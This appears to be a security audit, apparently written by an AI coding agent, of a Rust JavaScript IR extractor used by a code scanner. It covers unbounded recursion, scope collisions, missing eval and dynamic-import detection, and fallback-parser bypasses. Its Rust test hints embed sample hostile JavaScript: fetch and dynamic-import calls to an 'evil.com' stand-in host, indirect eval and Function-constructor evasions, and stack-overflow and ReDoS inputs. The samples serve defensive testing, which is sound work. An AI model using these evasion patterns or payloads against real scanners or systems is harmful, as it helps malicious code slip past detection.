# CRITIQUE: jsir/src  -  Security & Architecture Audit

**Date:** 2026-04-23  
**Scope:** `libs/scanner/jsir/src/` (read-only)  
**Auditor:** Kimi Code CLI  
**Hunt Targets:**
1. AST parser unbounded recursion
2. Identifier mangling collision
3. Source map preservation
4. ESM vs CJS ambiguity
5. eval / Function ctor / new Function detection completeness
6. Dynamic import resolution

---

## EXECUTIVE SUMMARY

`jsir` is a lightweight JavaScript IR extractor built atop `swc`. It makes a critical architectural error: it **stringifies the AST** immediately (`expr_to_string`) and then performs all downstream analysis on lossy text representations. This collapses lexical scopes, destroys type information, loses span granularity, and makes the entire pipeline vulnerable to obfuscation, collision, and precision loss. The AST visitor has **no recursion depth limits**, the resolution engine has **scope-unsafe binding maps**, and **zero source-map fidelity** is preserved. The fallback regex parser is a separate parser with different semantics, creating a dual-universe problem where the same input yields different IR depending on whether `swc` succeeded.

---

## FINDINGS

### 1. AST PARSER  -  Unbounded Recursion in Visitor & Stringifier

**CRITICAL | `src/visitor.rs:165-181`, `src/ast.rs:27-99`, `src/visitor.rs:333-348`**

**Description:**  
`IrCollector` implements `swc_ecma_visit::Visit` and calls `visit_children_with(self)` in every `visit_*` method without a depth guard. A malicious or accidentally deeply-nested JavaScript file (e.g., `((((((x))))))` nested 10,000 times, or a deeply nested object literal, or recursive `eval` payload) will cause a **stack overflow** in the Rust process. There is no `try_visit` or depth-counter bailout.  

Additionally, `expr_to_string` in `ast.rs` is mutually recursive with `member_expr_to_string`, `arrow_to_string`, `function_expr_to_string`, `prop_to_string`, `collect_pattern_symbols`, `collect_member_segments`, and `collect_expr_segments`. None of these carry a depth parameter. A single `Expr::Bin` nested 50,000 levels deep (or `Expr::Paren` wrappers) will overflow the stack during stringification before the visitor even finishes.

**Suggested Fix:**  
1. Add a `max_depth: usize` field to `IrCollector` and decrement it on every `visit_children_with` call; abort traversal at 0.  
2. Refactor `expr_to_string` into a non-recursive stack-based formatter, or add a `depth: usize` parameter to every recursive helper and cap at `256` (or configurable).  
3. Emit a structured error instead of silently truncating or crashing. The current `parse_javascript_ir_ast` returns `Option<JavaScriptIr>`  -  change it to `Result<JavaScriptIr, JsirError>` so callers can distinguish "parse failure" from "recursion limit exceeded".

**Test Hint:**  
```rust
let payload = "(".repeat(50000) + "1" + &")".repeat(50000);
let result = parse_javascript_ir_ast(&payload);
assert!(matches!(result, Err(JsirError::RecursionLimitExceeded)));
```

---

### 2. IDENTIFIER MANGLING & SCOPE COLLISION

**CRITICAL | `src/parser.rs:196-249`, `src/utils.rs:284-318`, `src/transform.rs:50-226`, `src/ast.rs:467-474`**

**Description:**  
The binding resolution system (`build_resolution_context`, `resolve_string_expression_with_context`, `helper_summaries`) uses flat `BTreeMap<String, String>` keyed by raw identifier name. **JavaScript lexical scoping is completely discarded.**

Consequences:
- A local `const url = "a"` inside function `f` and a local `const url = "b"` inside function `g` are merged into one binding. The IR cannot distinguish them.
- `helper_summaries` keys by function name string alone (`src/utils.rs:311`). If two functions in different scopes share a name (legal in JS), the helper summary map contains only the last-seen function. This causes wrong constant-propagation results.
- `extract_identifiers` (`src/parser.rs:196`) uses regex `[A-Za-z_$][A-Za-z0-9_$]*`, which **misses all Unicode identifiers** (e.g., `const \u{1F600} = 1;`, `let 変数 = 2;`). It also fails to strip JS keywords comprehensively  -  `NaN`, `Infinity`, `arguments` are treated as identifiers even though they are global properties/keywords in some contexts.
- `is_identifier` (`src/ast.rs:467`) allows dots inside identifiers (`chars.all(|ch| ... || matches!(ch, '_' | '$' | '.'))`), meaning `"a.b.c"` passes as a single identifier. This is used in `resolve_member_expression_with_context` to decide whether to substitute `{}` or abort, leading to false positives.

**Suggested Fix:**  
1. **Do not stringify the AST for binding resolution.** Use `swc`'s `Ident` symbols with their `SyntaxContext` (hygiene) to build scope-chain-aware bindings. Each binding should be a `(Symbol, ScopeId)` tuple, not a raw string.  
2. Replace `helper_summaries: BTreeMap<String, HelperSummary>` with a scoped lookup: `ScopeId -> BTreeMap<String, HelperSummary>`.  
3. Fix `extract_identifiers` to use `swc`'s lexer/tokenizer or at least support Unicode ID_Start/ID_Continue per ECMA-262.  
4. Fix `is_identifier` to reject dots; rename it to `is_simple_identifier` if it must exist at all.

**Test Hint:**  
```rust
let source = r#"
function f() { const x = "evil"; }
function g() { const x = "good"; return x; }
"#;
let ir = parse_javascript_ir(source);
let bindings = resolve_string_bindings(&ir, usize::MAX);
// Should be "good", but currently may be "evil" depending on parse order.
assert_eq!(bindings.get("x"), Some(&"good".to_string()));
```

---

### 3. SOURCE MAP PRESERVATION  -  COMPLETELY ABSENT

**CRITICAL | `src/parser.rs:19-55`, `src/types.rs:27-139`, `src/visitor.rs:16-18`**

**Description:**  
The only location information stored in the IR is a **1-indexed line number** (`usize`). No column, no byte offset, no span, no source-id. The `SourceMap` (`cm`) is created, used once to compute line numbers, and then dropped.  

Consequences:
- **Minified code mapped back to original sources is impossible.** If a scanner downstream wants to report "suspicious call at line 1, col 8421 in original file foo.js", it cannot. The IR is useless for accurate security triage.
- The fallback parser (`parse_javascript_ir_fallback`) computes line numbers by splitting on `\n`, which is incompatible with the AST parser's line numbers when the source contains multi-line string literals or template literals. A single minified file yields different `line` values depending on which parser path was taken.
- `visit_bin_expr` clones the entire `BinExpr` just to stringify it (`bin_expr.clone()` at `visitor.rs:335`)  -  expensive and still span-less.

**Suggested Fix:**  
1. Replace `line: usize` in every node type with a `SourceSpan { file: Lrc<FileName>, lo: u32, hi: u32, line: u32, col: u32 }`. Use `swc_common::Span` directly if you want zero-copy.  
2. Expose a source-map serializer (e.g., `vlq` mappings) so downstream consumers can map IR nodes back to original source positions.  
3. Remove the fallback parser, or make it emit the same span metadata by running a second lightweight line-col tokenizer. A dual parser is technical debt and a source of non-determinism.

**Test Hint:**  
```rust
let source = "fetch('https://evil.com');";
let ir = parse_javascript_ir(source);
assert!(ir.calls[0].span.is_some()); // Currently fails: no span field exists.
```

---

### 4. ESM vs CJS AMBIGUITY

**HIGH | `src/visitor.rs:239-287`, `src/ast.rs:19-25`, `src/parser.rs:57-193`**

**Description:**  
The IR has **zero distinction** between ESM and CJS module systems:
- `import` declarations are not visited at all  -  no `visit_import_decl` override exists.
- `require("fs")` is parsed as a generic `CallNode` with `callee = "require"`.
- `import("module")` (dynamic import) is converted by `callee_to_string` to the string `"import"` (`ast.rs:23`), then treated as a generic call. The module specifier is not extracted, not resolved, and not tracked.
- `export default function foo() {}` is not tracked as an export.
- `module.exports = ...` is just an assignment to `module.exports`  -  no semantic export tagging.

For a scanner pipeline, this means **you cannot answer:**
- Is this file ESM or CJS?
- What are its external dependencies?
- Does it dynamically import modules (a common code-splitting / lazy-loading vector)?
- Is `require` being shadowed or reassigned (a common obfuscation trick)?

**Suggested Fix:**  
1. Add `ImportNode`, `ExportNode`, and `DynamicImportNode` to `JavaScriptIr`.  
2. Implement `visit_import_decl`, `visit_export_decl`, and special-case `Callee::Import` in `visit_call_expr` to capture dynamic import specifiers.  
3. Distinguish `require` calls from other calls: if callee is bare `require` and the first argument is a string literal, emit a `CjsRequireNode`.  
4. Track `module.exports` and `exports.*` assignments as explicit export mutations.

**Test Hint:**  
```rust
let source = r#"const fs = require('fs'); import('https://evil.com/module.js').then(m => m.pwn());"#;
let ir = parse_javascript_ir(source);
assert!(ir.cjs_requires.iter().any(|r| r.module == "fs"));
assert!(ir.dynamic_imports.iter().any(|d| d.specifier == "https://evil.com/module.js"));
```

---

### 5. eval / Function CONSTRUCTOR / new Function DETECTION  -  INCOMPLETE

**CRITICAL | `src/visitor.rs:239-311`, `src/ast.rs:264-295`**

**Description:**  
The IR does not have a dedicated node for code-execution sinks. `eval("code")`, `new Function("code")`, `setTimeout("code", 0)`, and `setInterval("code", 0)` are all recorded as generic `CallNode` or `NewExpr` nodes. A downstream security rule must re-parse the callee string to detect these, which is fragile and incomplete.

Missed detection vectors:
- **Indirect eval:** `(0, eval)(code)`  -  the comma operator produces `eval` as a value but `member_chain` returns `None` for `Expr::Seq`, so the call is just a generic call with callee stringified as something like `(0, eval)(code)` or worse.
- **Computed property eval:** `window["ev"+"al"](code)`  -  callee string becomes `window["ev" + "al"]`, never matching `"eval"`.
- **Member-chain aliases:** `const e = eval; e(code);`  -  callee is `e`, not `eval`.
- `new Function(...)` is a `NewExpr`, but `Function` could be shadowed (`const Function = MySafeFn; new Function("bad")`). The IR does not track shadowing.
- `setTimeout` and `setInterval` with string first argument are **not detected at all**. The string argument is just another generic argument.
- `Reflect.construct(Function, ["code"])` is not handled.

**Suggested Fix:**  
1. Add a `CodeExecutionNode` enum to the IR with variants:
   - `DirectEval { expression: String, span: SourceSpan }`
   - `IndirectEval { expression: String, span: SourceSpan }`
   - `FunctionConstructor { arguments: Vec<String>, span: SourceSpan }`
   - `TimedExecution { kind: Timeout|Interval, code: String, span: SourceSpan }`
2. In `visit_call_expr`, detect:
   - Bare `eval` identifier callee → `DirectEval`
   - Any callee that resolves to `eval` via a single binding (track local aliases in a lightweight scope table during visitation) → `IndirectEval`
   - `setTimeout` / `setInterval` with a string-literal first arg → `TimedExecution`
3. In `visit_new_expr`, detect `new Function(...)` and `new Function.prototype.constructor(...)`.

**Test Hint:**  
```rust
let source = r#"
const e = eval;
(0, eval)("bad()");
window["eval"]("bad()");
setTimeout("bad()", 0);
new Function("return 1");
"#;
let ir = parse_javascript_ir(source);
assert_eq!(ir.code_executions.len(), 5);
```

---

### 6. DYNAMIC IMPORT RESOLUTION  -  MISSING

**HIGH | `src/visitor.rs:239-287`, `src/ast.rs:19-25`, `src/parser.rs:57-193`**

**Description:**  
Dynamic imports (`import(specifier)`) are invisible to the security model. They are recorded as generic `CallNode { callee: "import", ... }` with no special handling. The specifier expression is not resolved, not tracked as a dependency, and not marked as a dynamic import. This is a major gap because dynamic imports are the primary vector for:
- Polyglot payloads (`import("data:text/javascript,...")`)
- Runtime module loading of malicious sub-resources
- ESM-based code splitting that evades static analysis

Additionally, `import.meta.url` is a member expression that gets stringified to `"import.meta.url"` and treated as a generic property access. The IR does not know that `import.meta` is a meta-property, not a regular identifier.

**Suggested Fix:**  
1. In `visit_call_expr`, match on `Callee::Import(_)` and emit a `DynamicImportNode` containing:
   - `specifier: String` (raw expression)
   - `resolved_specifier: Option<String>` (if the expression is a string literal or resolves to one)
   - `span: SourceSpan`
2. In `visit_member_expr`, detect `import.meta` and `import.meta.url` / `import.meta.resolve` and emit `MetaPropertyNode`s.
3. Add a dependency graph field to `JavaScriptIr` that aggregates all static and dynamic dependencies.

**Test Hint:**  
```rust
let source = r#"const mod = import('./evil.js'); import(baseUrl + '/payload.js');"#;
let ir = parse_javascript_ir(source);
assert_eq!(ir.dynamic_imports.len(), 2);
assert_eq!(ir.dynamic_imports[0].resolved_specifier, Some("./evil.js".to_string()));
assert_eq!(ir.dynamic_imports[1].resolved_specifier, None);
```

---

## ADDITIONAL CRITICAL FINDINGS

### 7. FALLBACK PARSER NON-DETERMINISM & SECURITY BYPASS

**CRITICAL | `src/parser.rs:57-193`**

**Description:**  
`parse_javascript_ir` first tries `parse_javascript_ir_ast` (SWC), and if that returns `None` (any parse error, including benign ones like trailing commas in older ES modes), it falls back to a line-by-line regex parser. The regex parser has **completely different semantics**:
- It cannot parse nested expressions across lines.
- It misses assignments inside `if` conditions, loops, and IIFE arguments.
- It uses `line.starts_with("//")` to skip comments, missing block comments `/* ... */` entirely.
- An attacker can craft input that causes SWC to fail (e.g., intentionally malformed syntax that still runs in a browser's permissive parser) but passes the regex parser in a neutered form, hiding malicious calls.

**Suggested Fix:**  
Delete the fallback parser. If SWC fails, return an error. Do not silently downgrade to a weaker parser. If recovery parsing is required, use SWC's error-recovery mode or a dedicated fault-tolerant parser, not regex.

**Test Hint:**  
```rust
let source = r#"const x = 1; /* evil */ fetch('https://evil.com');"#;
let ir = parse_javascript_ir(source);
// Fallback parser misses block comments; if SWC fails, evil call is hidden.
assert!(ir.calls.iter().any(|c| c.callee == "fetch"));
```

---

### 8. TEMPLATE LITERAL INFORMATION LOSS

**HIGH | `src/ast.rs:79-84`, `src/utils.rs:201-206`**

**Description:**  
`expr_to_string` for `Expr::Tpl` joins quasi raw strings with `"${}"`, **discarding all interpolated expressions**. So `` `https://${domain}/track` `` becomes `` `https://${}${}` `` (actually `https://{}` due to join logic). This means:
- `collect_string_literals_from_expr` extracts only `"https://"` and `"/track"`, missing `domain`.
- The `string_concats` node is created for `BinExpr::Add` but **not** for template literals, even though template literals are the modern standard for string interpolation in JavaScript.
- `strip_template_literal` (`utils.rs:201`) returns `None` for any template containing `${`  -  which is exactly when a template literal is most interesting. It also uses `.contains("${")`, which falsely matches escaped sequences like `\${` or `$$${`.

**Suggested Fix:**  
1. Treat template literals as first-class string-concat nodes. Add `TemplateLiteralNode` to the IR with `quasis: Vec<String>` and `expressions: Vec<String>`.  
2. Fix `strip_template_literal` to use a proper brace-depth counter instead of substring search.  
3. In `expr_to_string`, preserve interpolated expressions, e.g., `` `https://${domain}/track` `` should stringify to something like `` `https://${domain}/track` `` or at minimum `"https://{} + domain + /track"`.

**Test Hint:**  
```rust
let source = r#"const url = `https://${host}/api`;"#;
let ir = parse_javascript_ir(source);
assert!(ir.string_concats.iter().any(|s| s.identifiers.contains("host")));
```

---

### 9. NUMBER BINDING INTEGER OVERFLOW / TRUNCATION

**HIGH | `src/resolve_numeric.rs:11-14`, `src/types.rs:148-152`**

**Description:**  
`resolve_numeric_expression` parses numbers with `expression.parse::<i64>()`. JavaScript numbers are IEEE-754 doubles (`f64`). A literal like `9007199254740993` (2^53 + 1) parses as `9007199254740992` in JS but `i64` parses it exactly in Rust. Conversely, `1.5` fails to parse as `i64` and is silently dropped. This asymmetry means:
- Floating-point bindings are lost entirely.
- Large integers that overflow `i64` (e.g., `9223372036854775808`) will cause a parse error and be ignored.
- The `number_bindings: BTreeMap<String, i64>` cannot represent JS semantics.

**Suggested Fix:**  
Change `number_bindings` to `BTreeMap<String, f64>` (or a newtype around `OrderedFloat<f64>` for `Eq`). Use `expression.parse::<f64>()` and handle `NaN` / `Infinity` explicitly.

**Test Hint:**  
```rust
let source = r#"const x = 1.5; const y = 9007199254740993;"#;
let ir = parse_javascript_ir(source);
let ctx = build_resolution_context(&ir, usize::MAX);
assert_eq!(ctx.number_bindings.get("x"), Some(&1.5_f64));
assert_eq!(ctx.number_bindings.get("y"), Some(&9007199254740993_f64));
```

---

### 10. REGEX DENIAL OF SERVICE IN FALLBACK PARSER

**HIGH | `src/parser.rs:58-80`**

**Description:**  
The fallback parser compiles multiple `Regex` objects inside `parse_javascript_ir_fallback`. While the regexes themselves appear bounded, the `message_send_regex` and `message_listener_regex` contain alternations with greedy quantifiers (`.*`, `.+?`). On adversarial input (e.g., a 10 MB line containing many `sendMessage` substrings), backtracking can cause **catastrophic backtracking** or at least CPU exhaustion. Because this runs on the fallback path after SWC failure, an attacker can intentionally trigger the fallback and then exploit the regex.

**Suggested Fix:**  
Delete the fallback parser (see Finding 7). If you must keep regex, use `regex::RegexBuilder` with a `size_limit` and use possessive/atomic groups where possible. Even better: use a linear-time regex engine like `regex-automata` with DFA guarantees.

**Test Hint:**  
```rust
let source = "a".repeat(1_000_000) + ".postMessage(";
let start = std::time::Instant::now();
let _ = parse_javascript_ir(&source);
assert!(start.elapsed() < std::time::Duration::from_secs(1));
```

---

### 11. DEPTH LIMIT INCONSISTENCY & BYPASS

**MEDIUM | `src/transform.rs:251`, `src/resolve_numeric.rs:26`, `src/eval.rs:14`**

**Description:**  
`resolve_string_expression_with_context` and `resolve_member_expression_with_context` bail at `depth > 8`. `resolve_numeric_expression_with_context` also bails at `depth > 8`. But `evaluate_condition` and `evaluate_truthy` do **not** check depth  -  they just pass `depth + 1` down. A deeply nested ternary or boolean expression chain can exhaust the stack in `evaluate_condition` before the numeric/string resolvers hit their limit. Furthermore, the depth is passed as `usize` and incremented at **every** call site, but some call sites add `+ 1` and the callee adds `+ 1` again, causing the limit to be reached prematurely for legitimate deep expressions (off-by-one inconsistency across modules).

**Suggested Fix:**  
1. Unify depth tracking into a single `DepthGuard` struct that increments on construction and decrements on drop.  
2. Apply the guard at the entry points (`evaluate_condition`, `resolve_string_expression_with_context`, etc.) with a single configurable limit (default 64).  
3. Return a structured `DepthLimitExceeded` error instead of `None`.

**Test Hint:**  
```rust
let expr = "a ".repeat(100).trim_end();
let result = evaluate_condition(&expr, &BTreeMap::new(), &BTreeMap::new(), &BTreeMap::new(), &BTreeMap::new(), 0);
assert!(result.is_none()); // Should not stack overflow.
```

---

### 12. ARRAY INDEX OVERFLOW / NEGATIVE INDEX BYPASS

**MEDIUM | `src/resolve_helper.rs:68-100`, `src/transform.rs:85-115`**

**Description:**  
`resolve_array_lookup` resolves the index via `usize::try_from(index).ok()?`. In JavaScript, negative indices via computed property access are valid strings (`arr[-1]`), but here they are silently dropped. More importantly, if `index` is negative and wraps due to two's complement, `usize::try_from` returns `None` and the lookup fails. However, if the attacker can cause the numeric resolver to return a very large `i64`, `usize::try_from` also returns `None`. The real issue is that `array_bindings.get(array_name.trim())` is done **before** checking whether the expression actually refers to an array binding, so an unbound identifier is silently skipped. But the bigger issue: `apply_array_push` in `resolve_object.rs` does `entry.resize(index + 1, String::new())`  -  if `index` is somehow very large (e.g., `arr[9999999] = "x"`), this allocates a 10-million-element `Vec<String>`.

**Suggested Fix:**  
1. Cap array resize to a configurable maximum (e.g., 4096). Return `None` if exceeded.  
2. Distinguish between numeric array indices and string property keys in the IR.

**Test Hint:**  
```rust
let source = r#"const arr = []; arr[9999999] = "x";"#;
let ir = parse_javascript_ir(source);
let ctx = build_resolution_context(&ir, usize::MAX);
// Should not allocate 10M strings.
assert!(ctx.array_bindings.get("arr").map(|v| v.len()).unwrap_or(0) < 10000);
```

---

### 13. `unwrap_or_else` / CLONE BLOAT IN RESOLUTION LOOP

**MEDIUM | `src/transform.rs:66-218`**

**Description:**  
`build_resolution_context` runs a fixed-point loop that clones the entire `string_bindings`, `number_bindings`, and `array_bindings` maps on every iteration (`previous_strings = string_bindings.clone()`). For N assignments and K iterations, this is O(K x N) clones. With 10,000 bindings and 10 iterations, that's 100,000 `BTreeMap` clones. This is a denial-of-service vector: adversarial input with many assignments and a helper that gradually resolves can force dozens of iterations.

**Suggested Fix:**  
1. Use a dirty-flag approach: only re-evaluate assignments whose identifiers intersect with changed bindings.  
2. Or, replace the fixed-point loop with a single topological pass if the dependency graph is acyclic (it usually is).  
3. If a loop is required, use `im::HashMap` (persistent data structures) for cheap snapshots.

**Test Hint:**  
```rust
let source = (0..10000).map(|i| format!("const x{i} = x{} + \"a\";", i.saturating_sub(1))).collect::<Vec<_>>().join("\n");
let ir = parse_javascript_ir(&source);
let start = std::time::Instant::now();
let _ = resolve_string_bindings(&ir, usize::MAX);
assert!(start.elapsed() < std::time::Duration::from_secs(2));
```

---

### 14. MISSING DOC COMMENTS ON PUBLIC API

**LOW | `src/lib.rs:40-48`, `src/parser.rs:11-12`, `src/transform.rs:11-48`**

**Description:**  
`#![warn(missing_docs)]` is enabled, yet several public functions lack doc comments with examples: `extract_identifiers`, `resolve_string_bindings`, `resolve_string_expression_at_line`, `resolve_member_expression_at_line`, `resolve_property_chain`, `resolve_string_expression`. The `README.md` shows a quick-start but the API surface is undocumented. This violates the project's own guarantee in `SPEC.md`: "All public types have doc comments."

**Suggested Fix:**  
Add doc comments with `# Examples` blocks to every public function and type. Run `cargo doc` and fail the build on warnings.

---

## ARCHITECTURAL VERDICT

`jsir` suffers from a **fundamental design flaw**: it converts a rich, typed, scoped AST into flat strings and then re-parses those strings with ad-hoc string manipulation. This is the opposite of how a robust IR should work. The correct architecture is:

1. **Keep the AST** (or a lightweight subset) for as long as possible.
2. **Perform analysis on AST nodes**, not on `expr_to_string` output.
3. **Preserve spans** for every IR node.
4. **Use SWC's hygiene/scope data** instead of raw identifier strings.
5. **Have a single parser** (SWC) with error recovery, not a regex fallback.

Until this refactor happens, every finding above is a band-aid on a broken foundation. Per **LAW 0**, the right fix is the deep refactor, not a series of local patches.

---

## COMPETITOR COMPARISON

| Capability | jsir (current) | oxc/ast | swc/ast |
|---|---|---|---|
| Recursion-safe visitor | No depth guard | Stack-safe | Stack-safe |
| Scope-aware bindings | Flat string map | Scope tree | SyntaxContext |
| Source spans per node | Line only | Full span | Full span |
| Source map output | None | Built-in | Built-in |
| ESM/CJS distinction | None | ModuleKind | ModuleKind |
| eval/Function detection | Generic calls | Custom lints | Custom passes |
| Dynamic import tracking | Generic call | ImportExpr | ImportExpr |
| Template literal support | Stripped/ignored | First-class | First-class |
| Number precision | i64 only | f64 | f64 |
| Fault-tolerant parse | Regex fallback | Error recovery | Error recovery |

---

*End of audit.*
